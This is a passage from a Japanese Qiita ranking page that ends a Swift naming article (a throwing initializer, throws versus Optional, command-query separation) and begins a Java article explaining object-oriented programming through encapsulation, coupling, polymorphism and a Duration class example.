<span id="少し脱線telisvalid-bool-よりも良い設計" class="fragment"></span><a href="#%E5%B0%91%E3%81%97%E8%84%B1%E7%B7%9Atelisvalid-bool-%E3%82%88%E3%82%8A%E3%82%82%E8%89%AF%E3%81%84%E8%A8%AD%E8%A8%88"><i class="fa fa-link"></i></a>少し脱線：　<code>Tel.isValid: Bool</code> よりも良い設計</h3>

<p>話の流れ上、 <code>isValid: Bool</code> というcomputed varを生やしましたが、そもそも不正なTel型を作れないようにするほうがよいです。型をinitするタイミングで同時にバリデートするのです。つまりこういうことです。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="kd">struct</span> <span class="nc">Tel</span> <span class="p">{</span>
    <span class="kd">enum</span> <span class="nc">Error</span><span class="p">:</span> <span class="n">Swift</span><span class="p">.</span><span class="n">Error</span> <span class="p">{</span>
        <span class="k">case</span> <span class="n">invalidFormat</span>
    <span class="p">}</span>
    <span class="kd">let</span> <span class="nv">value</span><span class="p">:</span> <span class="nb">String</span>
    <span class="kd">init</span><span class="p">(</span><span class="n">value</span><span class="p">:</span> <span class="nb">String</span><span class="p">)</span> <span class="kr">throws</span> <span class="p">{</span>
        <span class="k">guard</span> <span class="k">try</span> <span class="n">value</span><span class="p">.</span><span class="n">matches</span><span class="p">(</span><span class="n">pattern</span><span class="p">:</span> <span class="s">"^[0-9]+-[0-9]+-[0-9]+$"</span><span class="p">)</span> <span class="k">else</span> <span class="p">{</span>
            <span class="k">throw</span> <span class="n">Error</span><span class="p">.</span><span class="n">invalidFormat</span>
        <span class="p">}</span>
        <span class="kc">self</span><span class="p">.</span><span class="n">value</span> <span class="p">=</span> <span class="n">value</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div></div>

<p>余談でした。</p>

<h1>
<span id="まとめ" class="fragment"></span><a href="#%E3%81%BE%E3%81%A8%E3%82%81"><i class="fa fa-link"></i></a>まとめ</h1>

<p>お気づきでしょうか。<br>
引数を型にまとめるテクニックも、メソッドオブジェクトも、特性の横恋慕の解決も、要は<strong>「適切な型を作る」</strong>という話でした。<br>
型を用意することで、豊かに、かつ端的に意図を表現できるようになるのです。型ってすごい！<br>
考えてみれば当たり前で、オブジェクト指向で書く限り、メソッドもプロパティも何らかの型のメンバです。<br>
つまりネーミングの際には、メソッドであれば「何をする」、プロパティであれば「何である」という情報に意識が向きがちです。しかし、それだけでなく<strong>「誰がそれをする」「誰のものである」</strong>という部分に目を向けることで、よりよいネーミングに近づけるのではないでしょうか。</p>

<p>一言で言えば、<strong>「よりよいネーミングのためには、ちゃんとオブジェクト指向しようね」</strong>という話でした。</p>

<p>Happy Naming!😃　皆さんのコードが、よきネーミングとともにありますように。</p>

<h1>
<span id="おまけ-より豊かなネーミングのために" class="fragment"></span><a href="#%E3%81%8A%E3%81%BE%E3%81%91-%E3%82%88%E3%82%8A%E8%B1%8A%E3%81%8B%E3%81%AA%E3%83%8D%E3%83%BC%E3%83%9F%E3%83%B3%E3%82%B0%E3%81%AE%E3%81%9F%E3%82%81%E3%81%AB"><i class="fa fa-link"></i></a>おまけ: より豊かなネーミングのために</h1>

<p>ここからは、15分の発表枠では入らなかったよしなしごとをいくつか。</p>

<h2>
<span id="returns-optional-vs-throws" class="fragment"></span><a href="#returns-optional-vs-throws"><i class="fa fa-link"></i></a><code>returns Optional</code> vs <code>throws</code>
</h2>

<p>先程の余談では、throwsなinitが登場しました。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="kd">struct</span> <span class="nc">Tel</span> <span class="p">{</span>
    <span class="kd">enum</span> <span class="nc">Error</span><span class="p">:</span> <span class="n">Swift</span><span class="p">.</span><span class="n">Error</span> <span class="p">{</span>
        <span class="k">case</span> <span class="n">invalidFormat</span>
    <span class="p">}</span>
    <span class="kd">let</span> <span class="nv">value</span><span class="p">:</span> <span class="nb">String</span>     <span class="err">👇</span>
    <span class="kd">init</span><span class="p">(</span><span class="n">value</span><span class="p">:</span> <span class="nb">String</span><span class="p">)</span> <span class="kr">throws</span> <span class="p">{</span>
        <span class="k">guard</span> <span class="k">try</span> <span class="n">value</span><span class="p">.</span><span class="n">matches</span><span class="p">(</span><span class="n">pattern</span><span class="p">:</span> <span class="s">"^[0-9]+-[0-9]+-[0-9]+$"</span><span class="p">)</span> <span class="k">else</span> <span class="p">{</span>
            <span class="k">throw</span> <span class="n">Error</span><span class="p">.</span><span class="n">invalidFormat</span>
        <span class="p">}</span>
        <span class="kc">self</span><span class="p">.</span><span class="n">value</span> <span class="p">=</span> <span class="n">value</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div></div>

<p>しかし、Failable Initializerを使う( <code>init?(value: String)</code> )という手もあります。<br>
これらの利点・弱点を比較してみます。</p>

<ul>
<li>returns Optional

<ul>
<li>👍 お手軽簡単に扱える</li>
<li>👿 付加情報が乏しい</li>
</ul>
</li>
<li>例外処理(throws)

<ul>
<li>👍「失敗しうる」ことを明確に表せる</li>
<li>👍 <code>try?</code> 構文でOptionalに変換可能</li>
<li>👍 <code>Error</code> を定義して細やかに失敗原因を伝えられる</li>
<li>👿 <code>Error</code> を定義する必要がある</li>
</ul>
</li>
</ul>

<p>どちらも一長一短ではあります。<br>
しかし、ネーミングとは意図を表現するものであり、より豊かに意図を表現できるのはどちらかと考えると、自分はthrowsを積極的に使っていきたいです。<br>
もちろんそこまでの表現力を求めていない場合もあるでしょうから、そこではOptionalも充分な選択肢に入ります。この判断基準をもっと掘り下げたい方は、<a href="https://qiita.com/koher/items/a7a12e7e18d2bb7d8c77" id="reference-4664098368cff40c9e8a">Swiftのエラー4分類が素晴らしすぎるのでみんなに知ってほしい - Qiita</a>の「simple domain error」「recoverble error」について読むとヒントが得られるのではと思います。</p>

<h2>
<span id="言語機能を駆使しよう" class="fragment"></span><a href="#%E8%A8%80%E8%AA%9E%E6%A9%9F%E8%83%BD%E3%82%92%E9%A7%86%E4%BD%BF%E3%81%97%E3%82%88%E3%81%86"><i class="fa fa-link"></i></a>言語機能を駆使しよう</h2>

<p>自然言語も同じですが、細かい意図を表現するには、語彙を増やすことが欠かせません。プログラミング言語では、言語機能をどれだけ駆使できるかが、豊かな語彙に繋がります。前項の throws / optional　の話もそうですね。他には、ネーミングに活用できるSwiftの言語機能には以下のようなものがあります。</p>

<ul>
<li>自分自身の型を返すstatic func</li>
<li>operator

<ul>
<li>記号による処理を定義する</li>
<li>前置・中置・後置</li>
</ul>
</li>
<li>subscript

<ul>
<li>e.g.　 <code>reversiBoard[x: 10, y: 8]</code>
</li>
<li>複数の引数、ラベル付与も可能</li>
</ul>
</li>
</ul>

<h2>
<span id="コマンドクエリ分離原則cqrs" class="fragment"></span><a href="#%E3%82%B3%E3%83%9E%E3%83%B3%E3%83%89%E3%82%AF%E3%82%A8%E3%83%AA%E5%88%86%E9%9B%A2%E5%8E%9F%E5%89%87cqrs"><i class="fa fa-link"></i></a>コマンド・クエリ分離原則(CQRS)</h2>

<p>非同期処理の話では、引数や戻り値に結果を含めるデザインパターンを紹介しました。しかし、すべての処理結果を入力と出力で明示できるわけではありません。つまり、処理は<strong>副作用</strong>があるよね？　ということです。<br>
その現実と戦うためのテクニックで、「コマンド・クエリ分離原則(CQRS)」というものがあります。</p>

<ul>
<li>コマンド（戻り値なし、副作用を起こす）</li>
<li>クエリ（戻り値を期待、何度呼んでも同じ結果(冪等)）</li>
</ul>

<p>を分けると設計とネーミングがすっきりします。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="kd">var</span> <span class="nv">canFetch</span><span class="p">:</span> <span class="nb">Bool</span> <span class="c1">// クエリ</span>
<span class="kd">func</span> <span class="nf">startFetching</span><span class="p">(</span><span class="n">id</span><span class="p">:</span> <span class="nb">Int</span><span class="p">)</span> <span class="p">-&gt;</span> <span class="nb">Void</span> <span class="c1">// コマンド</span>
<span class="kd">let</span> <span class="nv">hoges</span><span class="p">:</span> <span class="n">Rx</span><span class="p">.</span><span class="n">Observable</span><span class="o">&lt;</span><span class="p">[</span><span class="n">Hoge</span><span class="p">]</span><span class="o">&gt;</span> <span class="c1">// 結果は通知される</span>
</pre></div></div>

<p>以上です。</p>

<div class="footnotes">
<hr>
<ol>

<li id="fn1">
<p>「新装版　リファクタリング　既存のコードを安全に改善する」2014年 P77 <a href="#fnref1">↩</a></p>
</li>

</ol>
</div>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">47位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>202</kbd>
		<a target="_blank" href="https://qiita.com/lamrongol/items/8a339721ee20a1c81e3c">オブジェクト指向とは結局何なのか あるいはプログラミングをする上で気をつけるべきたった一つのこと</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-10-30<br />00:00:08</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/49529.html">lamrongol</a>(10件の記事)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/49529/profile-images/1473691764">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[Java]</b> <b>[オブジェクト指向]</b> <b>[設計]</b> <b>[デザインパターン]</b> <b>[新人プログラマ応援]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="はじめに" class="fragment"></span><a href="#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB"><i class="fa fa-link"></i></a>はじめに</h1>

<p>プログラミングを勉強していればオブジェクト指向という言葉を1度は聞いたことがあるでしょう。しかしこのオブジェクト指向、かなり古くからあり現在でも大勢の人が使用しているにも関わらず何を意味しているかイマイチわかりません。あるページを見ると「カプセル化」「継承」「ポリモーフィズム」の要素を持つものと書いてある。しかし<a href="https://ubiteku.oinker.me/2016/05/09/what-is-oo-all-about/" rel="nofollow noopener" target="_blank">オブジェクト指向の提唱者はメッセージングと言っている</a>。<a href="https://ja.wikipedia.org/wiki/%E3%82%AA%E3%83%96%E3%82%B8%E3%82%A7%E3%82%AF%E3%83%88%E6%8C%87%E5%90%91%E3%83%97%E3%83%AD%E3%82%B0%E3%83%A9%E3%83%9F%E3%83%B3%E3%82%B0" rel="nofollow noopener" target="_blank">Wikipedia</a>を見ても背景が長々と続きいくつも種類があると書いてあってハッキリしない。</p>

<p>結局以下のような変数とメソッドが固まってるものという漠然とした理解になってる人が多いと思います（全く初耳という人は<a href="https://qiita.com/lamrongol/items/74f62fcbea9cf7e96c4d" id="reference-cd762fcb6045e78fa093">補足</a>を先にお読み下さい）。</p>

<div class="code-frame" data-lang="java"><div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">class</span> <span class="nc">SandBox</span> <span class="o">{</span>
    <span class="kt">int</span> <span class="n">hoge</span> <span class="o">=</span> <span class="mi">10</span><span class="o">;</span>
    <span class="kt">int</span> <span class="n">fuga</span> <span class="o">=</span> <span class="mi">20</span><span class="o">;</span>

    <span class="kt">int</span> <span class="nf">foo</span><span class="o">(){</span>
        <span class="k">return</span> <span class="n">hoge</span><span class="o">;</span>
    <span class="o">}</span>
    <span class="kt">int</span> <span class="nf">bar</span><span class="o">(){</span>
        <span class="k">return</span> <span class="n">fuga</span><span class="o">;</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div></div>

<p>しかし自分が趣味でも業務でもプログラミングを続けてきてわかったのは、結局オブジェクト指向、というか「プログラミングは○○であるべき」系の言説というのは<strong>ある一つの目的</strong>のために存在しており、それがわかればオブジェクト指向や「わかりやすい変数名をつけよう」などのプログラミング技法はたちどころに導かれるということです。</p>

<h1>
<span id="リーダブルコード" class="fragment"></span><a href="#%E3%83%AA%E3%83%BC%E3%83%80%E3%83%96%E3%83%AB%E3%82%B3%E3%83%BC%E3%83%89"><i class="fa fa-link"></i></a>リーダブルコード</h1>

<p>自分が趣味でプログラミングを始めた頃なぜオブジェクト指向で作ったりする必要があるのかわかりませんでした。また、「わかりやすい変数名をつけよう」などの注意書きも理解しつつも重要とは思いませんでした。実際のところ、これらは短くて自分だけが使うプログラムなら必要ありません。例えばあるフォルダ内のファイル名を一括変更（先頭に[既読]とつける）したい場合こんなコードで十分です。</p>

<div class="code-frame" data-lang="java"><div class="highlight"><pre><span></span><span class="n">File</span> <span class="n">a</span> <span class="o">=</span> <span class="k">new</span> <span class="n">File</span><span class="o">(</span><span class="s">"C:\\Users\\admin\\Documents\\ss"</span><span class="o">);</span>
<span class="k">for</span><span class="o">(</span><span class="n">File</span> <span class="n">f</span> <span class="o">:</span> <span class="n">a</span><span class="o">.</span><span class="na">listFiles</span><span class="o">()){</span>
    <span class="n">File</span> <span class="n">b</span> <span class="o">=</span> <span class="k">new</span> <span class="n">File</span><span class="o">(</span><span class="n">a</span><span class="o">,</span> <span class="s">"[既読]"</span><span class="o">+</span><span class="n">f</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
    <span class="n">f</span><span class="o">.</span><span class="na">renameTo</span><span class="o">(</span><span class="n">b</span><span class="o">);</span>
<span class="o">}</span>
</pre></div></div>

<p>わざわざオブジェクトを作る必要はありません。わかりやすい変数名を付ける必要もありません。1回使うだけで自分にさえわかればいいからそんなことをしても面倒なだけです。</p>

<p>ではなぜオブジェクト指向や変数名の付け方などが侃々諤々の議論になるかというと、それは<strong>長期間多人数</strong>で開発するプログラムを対象としているからです。業務で開発されるプログラムというのは、大きな会社で多人数で作られ何年間にもわたって調整を加えられます。だからこそ他の人が読んでも理解できるコードで、変更を加えても思わぬところに影響が出ないように疎結合（意味は後で説明します）な必要があるのです。なお、「自分は趣味で一人で作ってるだけだから関係ないな」と思ったらそれは間違いで、半年も空けば過去の自分が書いたコードの意味を忘れてしまうのでやっぱりわかりやすく疎結合に書く必要があります。</p>

<p>要するにオブジェクト指向や「わかりやすい変数名をつけよう」などのプログラミング技法は<strong>「他人（将来の自分含む）が読み書きしやすいコードを書く」</strong>ためにあるのです。</p>

<h1>
<span id="ではオブジェクト指向とは" class="fragment"></span><a href="#%E3%81%A7%E3%81%AF%E3%82%AA%E3%83%96%E3%82%B8%E3%82%A7%E3%82%AF%E3%83%88%E6%8C%87%E5%90%91%E3%81%A8%E3%81%AF"><i class="fa fa-link"></i></a>ではオブジェクト指向とは</h1>

<p>自分なりに説明すると、オブジェクト指向とは<strong>「他人（将来の自分含む）が読み書きしやすいコードを書く」ためにカプセル化などのルールを守った上でデータや機能のまとまり（クラス）を作ること</strong>です。<br>
これだけだとわからないと思うので例としてJavaのArrayListクラスを見てみましょう。</p>

<div class="code-frame" data-lang="java"><div class="highlight"><pre><span></span><span class="n">List</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span> <span class="n">list</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ArrayList</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;();</span>
<span class="n">list</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"C"</span><span class="o">);</span>
<span class="n">list</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"A"</span><span class="o">);</span>
<span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">list</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="mi">0</span><span class="o">));</span><span class="c1">//C</span>
</pre></div></div>

<p>Javaを知らない人でも（英語がわかるなら）このコードを読めば「listに"C"と"A"を加えて0番目の要素を取得してるんだな」とわかると思います。こんな風に<strong>クラスの中身を見なくてもコードの意味していることがわかる</strong>ことが重要で以下で説明するものも全てこのためにあります。なぜなら大会社が作ってるプログラムは場合によっては数百万行とかになるのでいちいちすべてのコードを把握するのは不可能だから（そしてもちろん小規模なプログラムでも把握しなければいけないコードが少ないほうが望ましいから）です。</p>

<h2>
<span id="カプセル化" class="fragment"></span><a href="#%E3%82%AB%E3%83%97%E3%82%BB%E3%83%AB%E5%8C%96"><i class="fa fa-link"></i></a>カプセル化</h2>

<p>オブジェクト指向のもっとも重要な特長がカプセル化です。これは「ユーザーが使うのに必要な部分だけ可視化してそれ以外は隠す」ということです。プログラミング言語的に言えば<strong>public（公開）</strong>と<strong>private（非公開）</strong>を適切に設定することです。<br>
例えばArrayListクラスは実は内部ではensureCapacityInternal()やgrow()などのメソッドがあり複雑な処理をしてるのですが、リストを使う側には関係ないのでprivate（非公開）になっていて、add()やget()などのユーザーが使うメソッドのみpublic（公開）になってます。これによりArrayListは内部を知らなくても簡単に使える安全なクラスになっているのです。</p>

<p>もっとわかりやすく言えば、例えば電卓です。あなたは電卓内部の電子回路がどんなふうになっているか知っているでしょうか？<br>
ほとんどの人はそんなもの知りません。しかし電卓は誰でも使うことができます。内部の電子回路はprivate（非公開）でボタンや表示画面はpublic（公開）だからです。もし電卓がケースに覆われておらず電子回路が露出していたらどうでしょう。ものすごく電子回路に詳しい人なら自分なりに改造して自分用の特殊な電卓にする事もできるかもしれません。しかしほとんどの人にとってそれは理解不能で、うっかり触ったりして不具合の原因になるのが関の山です。だから外部の操作を受け付ける部分だけpublic（公開）にして電子回路など内部の直接触れる必要がない、触れるべきではない部分はprivate（非公開）にしているのです。これが<strong>カプセル化</strong>です。<br>
あえて電卓をプログラム風に書くならこんな感じになるでしょう。</p>

<div class="code-frame" data-lang="java"><div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Calculator</span><span class="o">{</span>
    <span class="cm">/** ボタン「1」はpublic（公開） */</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">button1</span><span class="o">(){</span>
        <span class="c1">//処理</span>
    <span class="o">}</span>
    <span class="cm">/** ボタン「2」はpublic（公開） */</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">button2</span><span class="o">(){</span>
        <span class="c1">//処理        </span>
    <span class="o">}</span>

    <span class="o">...</span><span class="c1">//以下続く</span>

    <span class="cm">/** 内部で行う計算処理はprivate（非公開） */</span>
    <span class="kd">private</span> <span class="kt">double</span> <span class="nf">calculate</span><span class="o">(){</span>
        <span class="c1">//処理        </span>
    <span class="o">}</span>

    <span class="cm">/** 結果の表示はpublic（公開） */</span>
    <span class="kd">public</span> <span class="kt">double</span> <span class="nf">showResult</span><span class="o">(){</span>
        <span class="c1">//処理        </span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div></div>

<p>こう考えていくと「カプセル化」は日常生活にあまねく存在していることがわかります。テレビのリモコンがどんな信号を発信しているか知らなくてもテレビは操作できる。エンジンの設計図を知らなくても車は運転できる。年末調整の詳細を知らなくても経理部に書類を提出すれば年末調整してもらえる。こんな風に「内部は知らなくても何をすればどういう結果が返ってくるかわかる」というブラックボックスにすることで複雑な社会でも生きていけるし、大規模なプログラムも簡単に理解可能な形になるのです。<br>
冒頭でオブジェクト指向の提唱者は「メッセージング」と言っているという話をしましたが、外部の人が「メッセージ」を送って返ってくる「メッセージ」を受け取るだけで<strong>内部を知らなくても</strong>プログラミングできることが肝なのです。</p>

<h2>
<span id="密結合と疎結合" class="fragment"></span><a href="#%E5%AF%86%E7%B5%90%E5%90%88%E3%81%A8%E7%96%8E%E7%B5%90%E5%90%88"><i class="fa fa-link"></i></a>密結合と疎結合</h2>

<p>各要素の結びつきが強いのが密結合、弱いのが疎結合です。一般に密結合のものをクラスにまとめてクラス間は疎結合なのが良いとされます。<br>
例えば電卓クラスに日付計算のためのコードがあったらどうでしょう。「なんでもできるクラスのほうがいいじゃん！」と思う人もいるかもしれませんが日付計算は年月日を分けて計算したり曜日を出したりうるう年を考慮したりと通常の数値計算とはかなり異なります。そのため電卓クラスの中に日付計算のためのコードもあるとクラス内部を編集するとき互いに無関係なメソッドや変数が出てきて混乱してしまいます。使う側も同様です。素直に電卓クラスと日付計算クラスに分けたほうがいいでしょう。<br>
そしてクラス間は疎結合にします。例えば電卓クラスの状態が日付計算クラスの挙動に影響を与えるようになっていたら電卓クラスを直しただけのつもりなのに日付計算クラスにまで影響を与えてしまい思わぬバグが出てしまうかもしれません。もしどうしても電卓クラスの状態によって日付計算クラスの挙動を変えたいなら電卓クラスから必要なパラメータを取得するメソッドを作り、日付計算クラスにそれを受け取るメソッドを作って連携を「見える化」しましょう。</p>

<h2>
<span id="ポリモーフィズム多態性" class="fragment"></span><a href="#%E3%83%9D%E3%83%AA%E3%83%A2%E3%83%BC%E3%83%95%E3%82%A3%E3%82%BA%E3%83%A0%E5%A4%9A%E6%85%8B%E6%80%A7"><i class="fa fa-link"></i></a>ポリモーフィズム（多態性）</h2>

<p>ポリモーフィズムとは外面は同じにして内部の処理は多様に変更できることです。例えばテレビのリモコンを考えてください。シャープやパナソニックなどいろんな会社がテレビを作っていてリモコンも内部の電子回路などは異なりますが、チャンネル切り替えボタンや音量の上下ボタンが有ることは共通していて、動作も同じです。このように内部の実装は異なっても「どんな機能を持つのか」という外面は共通させられるのが<strong>ポリモーフィズム</strong>です。<br>
もしリモコンをプログラム風に書くなら以下のような<a href="https://qiita.com/lamrongol/items/74f62fcbea9cf7e96c4d#%E3%82%A4%E3%83%B3%E3%82%BF%E3%83%BC%E3%83%95%E3%82%A7%E3%83%BC%E3%82%B9interface" id="reference-cd762fcb6045e78fa093">インターフェース(interface)</a>になるでしょう。</p>

<div class="code-frame" data-lang="java"><div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">interface</span> <span class="nc">RemoteController</span><span class="o">{</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">channel1</span><span class="o">();</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">channel2</span><span class="o">();</span>
    <span class="o">...</span><span class="c1">//以下続く</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">volumuUp</span><span class="o">();</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">volumuDown</span><span class="o">();</span>
    <span class="o">...</span><span class="c1">//以下続く    </span>
<span class="o">}</span>
</pre></div></div>

<p>こうすると書く人には「内部の実装は各自変えて良いがこういう機能を持つことは約束してくれ」と伝えられますし、ユーザーはどのメーカーかを気にせずリモコンとして同じように使えます。<br>
具体的なプログラムで言うと、例えばJavaのArrayListクラスとLinkedListクラスがこれに当たります。詳しい話はアルゴリズム関係の本を読んでほしいと思いますが、前者は値の取得は高速だが要素の挿入や削除は低速、後者はその逆という特徴があります。しかしどちらもListインターフェースを継承してるので<strong>内部の実装と関係なく</strong>add()やget()メソッドでリストとして同じように使えることがわかるのです。</p>

<p>ところでオブジェクト指向をやっている人は「インターフェースの継承はわかったけどクラスの継承は？」と思うかもしれませんが、クラスの継承は親クラスの詳細を知らないと思わぬ挙動をしたり、階層が深くなると変数が多階層に散らばって追うのが大変になったり、同じ名前の変数が重複して混乱するなどの問題があるのであまり使わないほうがいいです。実際<a href="https://www.javaworld.com/article/2073649/core-java/why-extends-is-evil.html" rel="nofollow noopener" target="_blank">Javaの生みの親もクラスの継承(extends)はできるだけ避けるべきだと言っています</a>。</p>

<h1>
<span id="実践編" class="fragment"></span><a href="#%E5%AE%9F%E8%B7%B5%E7%B7%A8"><i class="fa fa-link"></i></a>実践編</h1>

<p>では以上のことを踏まえて簡単なオブジェクト指向プログラミングをしてみましょう。言語はJavaですがJavaを知らない人にもわかるように書きます。作るのは「期間」を計算するプログラムです。例えば「2ヶ月18日」働いた後「1ヶ月4日」働いたら合計「3ヶ月22日」働いたと出力するプログラムです。<br>
ただし、30日を1ヶ月と換算します。つまり、「1ヶ月24日」働いて「3ヶ月15日」働いたら、合計は「4ヶ月39日」ですが、30日は1ヶ月と換算するので日数から30を引いて月に1を足し、「5ヶ月9日」と出力します。</p>

<p>オブジェクト指向なしにプログラムを書くと以下のようになります。</p>

<div class="code-frame" data-lang="java"><div class="highlight"><pre><span></span><span class="kt">int</span> <span class="n">monthNum</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
<span class="kt">int</span> <span class="n">dayNum</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>

<span class="c1">//1ヶ月24日働く</span>
<span class="n">monthNum</span> <span class="o">=</span> <span class="n">monthNum</span> <span class="o">+</span> <span class="mi">1</span><span class="o">;</span>
<span class="n">dayNum</span> <span class="o">=</span> <span class="n">dayNum</span> <span class="o">+</span> <span class="mi">24</span><span class="o">;</span>
<span class="c1">////30日を1ヶ月換算</span>
<span class="n">monthNum</span> <span class="o">=</span> <span class="n">monthNum</span> <span class="o">+</span> <span class="n">dayNum</span><span class="o">/</span><span class="mi">30</span><span class="o">;</span>
<span class="n">dayNum</span> <span class="o">=</span> <span class="n">dayNum</span><span class="o">%</span><span class="mi">30</span><span class="o">;</span>

<span class="c1">//3ヶ月15日働く</span>
<span class="n">monthNum</span> <span class="o">=</span> <span class="n">monthNum</span> <span class="o">+</span> <span class="mi">3</span><span class="o">;</span>
<span class="n">dayNum</span> <span class="o">=</span> <span class="n">dayNum</span> <span class="o">+</span> <span class="mi">15</span><span class="o">;</span>
<span class="c1">////30日を1ヶ月換算</span>
<span class="n">monthNum</span> <span class="o">=</span> <span class="n">monthNum</span> <span class="o">+</span> <span class="n">dayNum</span><span class="o">/</span><span class="mi">30</span><span class="o">;</span>
<span class="n">dayNum</span> <span class="o">=</span> <span class="n">dayNum</span><span class="o">%</span><span class="mi">30</span><span class="o">;</span>

<span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">((</span><span class="n">monthNum</span><span class="o">/</span><span class="mi">12</span><span class="o">)+</span><span class="s">"年"</span><span class="o">+(</span><span class="n">monthNum</span><span class="o">%</span><span class="mi">12</span><span class="o">)+</span><span class="s">"ヶ月"</span><span class="o">+</span><span class="n">dayNum</span><span class="o">+</span><span class="s">"日"</span><span class="o">);</span><span class="c1">//0年5ヶ月9日          </span>
</pre></div></div>

<p>これでも計算はできますが、コードがごちゃごちゃしてますしコピペミスでバグが発生するかもしれません。そこでDuration（「期間」という意味）クラスを使って以下のようなコードにしてみましょう。</p>

<div class="code-frame" data-lang="java"><div class="highlight"><pre><span></span><span class="n">Duration</span> <span class="n">durationSum</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Duration</span><span class="o">(</span><span class="mi">0</span><span class="o">,</span> <span class="mi">0</span><span class="o">);</span>

<span class="c1">//1ヶ月24日働く</span>
<span class="n">Duration</span> <span class="n">duration1</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Duration</span><span class="o">(</span><span class="mi">1</span><span class="o">,</span> <span class="mi">24</span><span class="o">);</span>
<span class="n">durationSum</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">duration1</span><span class="o">);</span>

<span class="c1">//3ヶ月15日働く</span>
<span class="n">Duration</span> <span class="n">duration2</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Duration</span><span class="o">(</span><span class="mi">3</span><span class="o">,</span> <span class="mi">15</span><span class="o">);</span>
<span class="n">durationSum</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">duration2</span><span class="o">);</span>

<span class="c1">//自動的にtoString()が呼ばれる</span>
<span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">durationSum</span><span class="o">);</span><span class="c1">//0年5ヶ月9日</span>
</pre></div></div>

<p>どうでしょうか。（英語がわかれば）読むだけでわかるスッキリしたコードになったと思います。Durationクラス自体は以下のようにします。</p>

<div class="code-frame" data-lang="java">
<div class="code-lang"><span class="bold">Duration.java</span></div>
<div class="highlight"><pre><span></span><span class="cm">/** 「期間」クラス。DAY_OF_MONTH日数は1ヶ月と自動的に換算する */</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Duration</span> <span class="o">{</span>
  <span class="cm">/** 1ヶ月とみなす日数 */</span>
  <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="kt">int</span> <span class="n">DAY_OF_MONTH</span> <span class="o">=</span> <span class="mi">30</span><span class="o">;</span>  

  <span class="c1">//ユーザーが勝手に変更できないようにprivate（非公開）にする</span>
  <span class="kd">private</span> <span class="kt">int</span> <span class="n">monthNum</span><span class="o">;</span><span class="c1">//月数</span>
  <span class="kd">private</span> <span class="kt">int</span> <span class="n">dayNum</span><span class="o">;</span><span class="c1">//日数</span>

  <span class="cm">/** monthNumヶ月dayNum日 */</span>
  <span class="kd">public</span> <span class="nf">Duration</span><span class="o">(</span><span class="kt">int</span> <span class="n">monthNum</span><span class="o">,</span> <span class="kt">int</span> <span class="n">dayNum</span><span class="o">){</span>
    <span class="c1">//DAY_OF_MONTH(30)日は1ヶ月換算</span>
    <span class="k">this</span><span class="o">.</span><span class="na">monthNum</span> <span class="o">=</span> <span class="n">monthNum</span> <span class="o">+</span> <span class="n">dayNum</span><span class="o">/</span><span class="n">DAY_OF_MONTH</span><span class="o">;</span>
    <span class="k">this</span><span class="o">.</span><span class="na">dayNum</span> <span class="o">=</span> <span class="n">dayNum</span> <span class="o">%</span> <span class="n">DAY_OF_MONTH</span><span class="o">;</span>
  <span class="o">}</span>

  <span class="kd">public</span> <span class="kt">void</span> <span class="nf">add</span><span class="o">(</span><span class="n">Duration</span> <span class="n">duration</span><span class="o">){</span>
    <span class="k">this</span><span class="o">.</span><span class="na">monthNum</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">monthNum</span> <span class="o">+</span> <span class="n">duration</span><span class="o">.</span><span class="na">getMonthNum</span><span class="o">();</span>
